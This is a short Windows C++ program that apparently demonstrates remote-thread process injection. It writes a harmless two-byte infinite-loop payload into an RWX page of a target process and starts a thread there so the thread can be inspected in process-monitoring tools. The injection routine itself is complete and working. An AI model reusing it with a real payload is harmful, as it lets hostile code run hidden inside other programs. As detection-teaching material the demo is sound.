// sc_infloop.cpp — injects "jmp $" shellcode (2-byte infinite loop)
// Target stays alive, injected thread spins forever so you can inspect it
// in Process Hacker / Task Manager / SysInternals Process Explorer.
//
// Build: cl /EHsc /O2 /nologo sc_infloop.cpp /link /OUT:sc_infloop.exe
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// Minimal 2-byte shellcode: EB FE = "jmp -2" = infinite loop at same address
unsigned char shellcode[] = { 0xEB, 0xFE };

int main(int argc, char** argv) {
    if (argc != 2) { printf("Usage: %s <PID>\n", argv[0]); return 1; }
    DWORD pid = atoi(argv[1]);
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { printf("[!] OpenProcess %lu\n", GetLastError()); return 2; }

    // Allocate RWX page (will show as RED in Process Hacker)
    LPVOID buf = VirtualAllocEx(hProc, nullptr, 0x1000,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, buf, shellcode, sizeof(shellcode), nullptr);
    printf("[+] shellcode @ %p (RWX, 2-byte infinite loop)\n", buf);

    HANDLE hT = CreateRemoteThread(hProc, nullptr, 0,
        (LPTHREAD_START_ROUTINE)buf, nullptr, 0, nullptr);
    DWORD tid = GetThreadId(hT);
    printf("[+] remote thread TID=%lu created at entry %p\n", tid, buf);
    printf("[+] thread spins forever - inspect it with Process Hacker now\n");

    CloseHandle(hT); CloseHandle(hProc);
    return 0;
}
